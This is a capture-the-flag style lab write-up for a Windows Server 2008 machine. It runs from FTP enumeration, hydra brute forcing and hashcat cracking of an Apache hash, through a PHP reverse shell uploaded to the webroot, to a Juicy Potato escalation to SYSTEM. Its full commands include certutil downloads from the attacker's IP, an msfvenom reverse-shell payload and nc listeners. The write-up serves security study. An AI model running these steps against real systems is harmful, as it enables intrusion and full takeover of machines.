---
date: 2025-08-19
title: Authby
tags:
  - Windows
  - FTP
  - Privilege-Escalation
  - Intermediate
---
Difficulty: Intermediate
# Service Enumeration
`nmap 192.168.120.46 -p- -oN ver_script.nmap -sV -sC`

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 May 11 06:44 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 02  2024 accounts
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth:
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info:
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2025-05-10T23:44:34+00:00
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2024-08-01T06:37:13
|_Not valid after:  2025-01-31T06:37:13
|_ssl-date: 2025-05-10T23:44:39+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Port 21: zFTPServer 6.0 build 2011-10-17
We can see from the port scan that we have access to some files which appear to be related to the FTP server via anonymous login.
I'll download them to my machine for further inspection:
`wget -m --no-passive ftp://$ip`

Out of these, we're only permitted to download four top-level directories, each of which contains a file named .listing:
`tree . -a`
```
.
├── accounts
│   ├── backup
│   │   └── .listing
│   └── .listing
├── certificates
│   └── .listing
├── extensions
│   └── .listing
├── .listing
└── log
    └── .listing
```

The most interesting of these reveals some FTP accounts on the server, while some of the others are blank directory listings:

`cat accounts/backup/.listing`

```
total 4
----------   1 root     root          764 Jul 10  2020 acc[Offsec].uac
----------   1 root     root         1030 Jul 10  2020 acc[anonymous].uac
----------   1 root     root          926 Jul 10  2020 acc[admin].uac
d--x--x--x   1 root     root          512 May 10 23:51 ..
d--x--x--x   1 root     root          512 May 10 23:51 .
```

# Brute forcing admin access on FTP
I was able to brute force the admin user's credentials to gain access to a new set of files which we previously didn't have access to. 
`hydra ftp://192.168.120.46 -l admin -P /usr/share/wordlists/rockyou.txt`

*The password was also "admin"... a good reminder that it's worthwhile to try some common passwords manually before jumping to brute force.*

```
[21][ftp] host: 192.168.120.46   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
```

`wget -m --no-passive ftp://admin:admin@192.168.120.46`

`tree . -a`

```
.
├── .htaccess
├── .htpasswd
├── index.php
└── .listing

1 directory, 4 files
```

.htaccess is presumably a configuration for the Apache server running on port 242. The AuthName text matches that found on the running service, and this tells us that the contents of .htpassword should be valid for accessing this page via HTTP Basic auth.

```
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>
```

.htpasswd reveals a password hash for the "offsec" user which we found during our initial FTP access.
```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

APR1 was unfamiliar to me, but it turns out that it represents a MD5 hash and salt in Apache: https://httpd.apache.org/docs/2.4/misc/password_encryptions.html

I tried guessing a few passwords for Offsec's FTP like admin and offsec, but none of them worked so it was time to try cracking this hash.

# Cracking hash for HTTP Basic Auth user offsec
Format hash.txt like so:
`$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0`

`hashcat -m 1600 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt`

The job finishes quickly to reveal the offsec user's password, "elite".

We're able to authenticate to the site on port 242 using offsec:elite, and reach a basic page with the same latin text from earlier, which translates from Latin to English as "He who wants to be a nut from a nut, breaks the nut!"

![[Pasted image 20250510182039.png]]

At this point I'm thinking it's time to test whether we can gain initial access by uploading a PHP web or reverse shell as the admin user. It's possible that it was just a backup of the webroot directory, but let's test the theory now that we're able to access the website.

I'll create a test.php file using index.php as an example and upload it.

![[Pasted image 20250510183040.png]]

Now, we can visit test.php in the browser or use curl to confirm that it was indeed uploaded to the webroot and is being served.

![[Pasted image 20250510183124.png]]

`curl http://192.168.120.46:242/index.php -H "Authorization: Basic b2Zmc2VjOmVsaXRl"`

```
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>
```

*In this curl command, we're providing the HTTP Basic auth using `-H "Authorization: Basic b2Zmc2VjOmVsaXRl"` -- b2Zmc2VjOmVsaXRl is the base64 encoding of username:password, which I got with `echo -n "offsec:elite" | base64` in our case*.

# Exploiting FTP->writable webroot for initial access
Now I'll generate a PHP reverse shell (I like PHP Ivan Sincek for Windows via revshells.com) and upload to the webroot in the same way. I'll start a netcat listener with `sudo nc -lnvp 80` and make a get request to /shell.php to gain a reverse shell on the server.

`curl http://192.168.120.46:242/shell.php -H "Authorization: Basic b2Zmc2VjOmVsaXRl"`


![[Pasted image 20250510183955.png]]

I found the first flag in `C:\apache\Desktop\local.txt`.

# Privilege Escalation
As shown above, we have `SeImpersonatePrivilege` enabled on the apache account. 


```
Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We can see that this server is running Windows Server 2008 Standard by running `systeminfo`.

`C:\Users\apache\Desktop>systeminfo`

```
Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          5/11/2025, 12:30:49 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,668 MB
Page File: Max Size:       1,985 MB
Page File: Available:      1,547 MB
Page File: In Use:         438 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A
```

Using [this site](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) as a guide, we should be able to use [Juicy Potato](https://github.com/ohpe/juicy-potato) to escalate to SYSTEM.

I'll download JuicyPotato.exe onto my attacking machine, start an HTTP Server, and download it from the attacking Machine using certutil:
`certutil -urlcache -split -f http://192.168.45.171:443/JuicyPotato.exe JuicyPotato.exe`

`juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`

```
This version of C:\Users\apache\Desktop\JuicyPotato.exe is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need a x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.
```

`systeminfo` also tells us that the server's architecture is x64 but 32-bit (which is contradictory info probably emerging from the virtualization). I confirmed that it's 32-bit, so x64 by running `echo %PROCESSOR_ARCHITECTURE%`.

We'll need to either cross compile or find a compatible binary... and since I don't have easy access to a Windows environment with Visual Studio, I kept looking and eventually found [one](https://github.com/k4sth4/Juicy-Potato/blob/main/x86/jp32.exe). 

`certutil -urlcache -split -f http://192.168.45.171:443/jp32.exe jp32.exe`

Now I was able to run the executable, but it didn't execute as expected:

`jp32.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`

```
Testing {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} 1337
COM -> recv failed with error: 10038
```

However, I succeeded by using {4991d34b-80a1-4291-83b6-3328366b9097} for the CLSID. This value was suggested by ChatGPT simply for being another well-known CSLID on Windows 2008, so this was a bit lucky, but we still got it. 

`jp32.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}`

```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

*Researching a bit afterwards, I ended up finding a [list](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) in the original ohpe/juicy-potato repo with well-known CLSIDs on various versions of Windows. This one is used by BITS and runs as NT AUTHORITY\SYSTEM*

![[Pasted image 20250510192805.png]]

Lastly, we just need to use this exploit to run a program as SYSTEM:

I used msfvenom to generate a TCP reverse shell binary on my attacking machine:

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.171 LPORT=443 -f exe -a x86 --platform windows -o revshell.exe`

...served it with `python3 -m http.server 443` and transferred it over using certutil as done previously:

`certutil -urlcache -split -f http://192.168.45.171:443/revshell.exe revshell.exe`

Now I'll stop my HTTP server to start a netcat listener on the attacking machine:

`sudo nc -lnvp 443`

And finally use my Juicy Potato binary to run the reverse shell as SYSTEM:

`jp32.exe -l 443 -p .\revshell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}`

![[Pasted image 20250511130650.png]]

Now having a shell as nt authority\system, I was able to read the root flag in C:\Users\Administrator\Desktop\proof.txt.
